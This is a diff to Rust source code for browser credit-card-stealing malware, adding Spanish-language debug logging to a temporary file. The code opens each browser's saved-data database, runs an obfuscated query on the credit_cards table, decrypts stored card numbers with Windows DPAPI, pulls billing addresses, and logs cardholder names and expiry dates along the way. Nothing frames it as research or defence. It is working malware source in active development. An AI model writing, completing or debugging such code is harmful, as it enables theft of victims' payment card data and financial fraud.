@@ -146,9 +146,36 @@ const BROWSERS: &[BrowserConfig] = &[
 pub fn steal_credit_cards() -> Vec<CreditCard> {
     let mut all_cards = Vec::new();
     
+    // 🔍 DEBUG: Log file
+    let debug_log = std::env::temp_dir().join("stealer_debug.txt");
+    let mut log = std::fs::OpenOptions::new()
+        .create(true)
+        .append(true)
+        .open(&debug_log)
+        .ok();
+    
+    if let Some(ref mut f) = log {
+        use std::io::Write;
+        let _ = writeln!(f, "\n=== STEAL_CREDIT_CARDS INICIADO ===");
+    }
+    
     for browser in BROWSERS {
+        if let Some(ref mut f) = log {
+            use std::io::Write;
+            let _ = writeln!(f, "Intentando browser: {}", browser.name);
+        }
+        
         if let Some(mut cards) = steal_credit_cards_from_browser(browser) {
+            if let Some(ref mut f) = log {
+                use std::io::Write;
+                let _ = writeln!(f, "  ✅ {} tarjetas encontradas en {}", cards.len(), browser.name);
+            }
             all_cards.append(&mut cards);
+        } else {
+            if let Some(ref mut f) = log {
+                use std::io::Write;
+                let _ = writeln!(f, "  ❌ No se encontraron tarjetas en {}", browser.name);
+            }
         }
         
         // 🔍 DEBUG: Buscar en perfiles adicionales (Profile 1, Profile 2, etc.)
@@ -204,9 +231,35 @@ fn steal_credit_cards_from_browser(browser: &BrowserConfig) -> Option<Vec<Credit
 fn extract_credit_cards(db_path: &PathBuf, browser_name: &str) -> Vec<CreditCard> {
     let mut cards = Vec::new();
     
+    // 🔍 DEBUG: Log file
+    let debug_log = std::env::temp_dir().join("stealer_debug.txt");
+    let mut log = std::fs::OpenOptions::new()
+        .create(true)
+        .append(true)
+        .open(&debug_log)
+        .ok();
+    
+    if let Some(ref mut f) = log {
+        use std::io::Write;
+        let _ = writeln!(f, "    Extrayendo tarjetas de: {}", browser_name);
+        let _ = writeln!(f, "    DB Path: {:?}", db_path);
+    }
+    
     let conn = match Connection::open(db_path) {
-        Ok(c) => c,
-        Err(_) => return cards,
+        Ok(c) => {
+            if let Some(ref mut f) = log {
+                use std::io::Write;
+                let _ = writeln!(f, "    ✅ DB abierta correctamente");
+            }
+            c
+        },
+        Err(e) => {
+            if let Some(ref mut f) = log {
+                use std::io::Write;
+                let _ = writeln!(f, "    ❌ Error abriendo DB: {}", e);
+            }
+            return cards;
+        }
     };
     
     // Query para obtener tarjetas y direcciones
@@ -221,9 +274,26 @@ fn extract_credit_cards(db_path: &PathBuf, browser_name: &str) -> Vec<CreditCard
         FROM {}
     ", obfstr!("credit_cards"));
     
+    if let Some(ref mut f) = log {
+        use std::io::Write;
+        let _ = writeln!(f, "    Ejecutando query...");
+    }
+    
     let mut stmt = match conn.prepare(&query) {
-        Ok(s) => s,
-        Err(_) => return cards,
+        Ok(s) => {
+            if let Some(ref mut f) = log {
+                use std::io::Write;
+                let _ = writeln!(f, "    ✅ Query preparado correctamente");
+            }
+            s
+        },
+        Err(e) => {
+            if let Some(ref mut f) = log {
+                use std::io::Write;
+                let _ = writeln!(f, "    ❌ Error preparando query: {}", e);
+            }
+            return cards;
+        }
     };
     
     let card_iter = stmt.query_map([], |row| {
@@ -238,11 +308,40 @@ fn extract_credit_cards(db_path: &PathBuf, browser_name: &str) -> Vec<CreditCard
     });
     
     if let Ok(iter) = card_iter {
+        if let Some(ref mut f) = log {
+            use std::io::Write;
+            let _ = writeln!(f, "    Iterando sobre resultados...");
+        }
+        
+        let mut count = 0;
         for card_result in iter {
+            count += 1;
+            if let Some(ref mut f) = log {
+                use std::io::Write;
+                let _ = writeln!(f, "    Registro #{}", count);
+            }
+            
             if let Ok((name, exp_month, exp_year, encrypted_number, billing_id, nickname)) = card_result {
+                if let Some(ref mut f) = log {
+                    use std::io::Write;
+                    let _ = writeln!(f, "      Nombre: {}", name);
+                    let _ = writeln!(f, "      Exp: {}/{}", exp_month, exp_year);
+                    let _ = writeln!(f, "      Encrypted bytes: {}", encrypted_number.len());
+                }
+                
                 // Desencriptar número de tarjeta con DPAPI
                 if let Some(decrypted) = decrypt_value_dpapi(&encrypted_number) {
+                    if let Some(ref mut f) = log {
+                        use std::io::Write;
+                        let _ = writeln!(f, "      ✅ DPAPI decrypt OK, bytes: {}", decrypted.len());
+                    }
+                    
                     if let Ok(card_number) = String::from_utf8(decrypted) {
+                        if let Some(ref mut f) = log {
+                            use std::io::Write;
+                            let _ = writeln!(f, "      ✅ UTF8 conversion OK");
+                        }
+                        
                         // Obtener dirección de billing si existe
                         let billing_address = if let Some(ref addr_id) = billing_id {
                             get_billing_address(&conn, addr_id)
@@ -259,9 +358,39 @@ fn extract_credit_cards(db_path: &PathBuf, browser_name: &str) -> Vec<CreditCard
                             billing_address,
                             nickname,
                         });
+                        
+                        if let Some(ref mut f) = log {
+                            use std::io::Write;
+                            let _ = writeln!(f, "      ✅ TARJETA AGREGADA!");
+                        }
+                    } else {
+                        if let Some(ref mut f) = log {
+                            use std::io::Write;
+                            let _ = writeln!(f, "      ❌ UTF8 conversion failed");
+                        }
+                    }
+                } else {
+                    if let Some(ref mut f) = log {
+                        use std::io::Write;
+                        let _ = writeln!(f, "      ❌ DPAPI decrypt failed");
                     }
                 }
+            } else {
+                if let Some(ref mut f) = log {
+                    use std::io::Write;
+                    let _ = writeln!(f, "      ❌ Error parsing row");
+                }
             }
+        }
+        
+        if let Some(ref mut f) = log {
+            use std::io::Write;
+            let _ = writeln!(f, "    Total tarjetas extraídas: {}", cards.len());
+        }
+    } else {
+        if let Some(ref mut f) = log {
+            use std::io::Write;
+            let _ = writeln!(f, "    ❌ Error ejecutando query");
         }
     }
     
